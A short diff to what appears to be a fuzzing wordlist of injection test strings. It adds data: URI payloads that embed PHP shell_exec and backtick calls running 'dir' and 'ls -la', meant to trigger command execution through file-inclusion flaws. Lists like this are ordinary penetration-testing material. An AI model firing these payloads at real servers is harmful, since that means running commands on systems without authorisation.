@@ -1,4 +1,3 @@
-
 !
 !'
 "
@@ -10,6 +9,11 @@
 & 
 &&
 && 
+data:text/plain,hello world
+data:text/plain,<?php echo shell_exec("dir") ?>
+data:text/plain,<?php echo shell_exec("ls -la") ?>
+data:text/plain,<?php echo `dir` ?>
+data:text/plain,<?php echo `ls -la` ?>
 '
 ' --
 ' ;
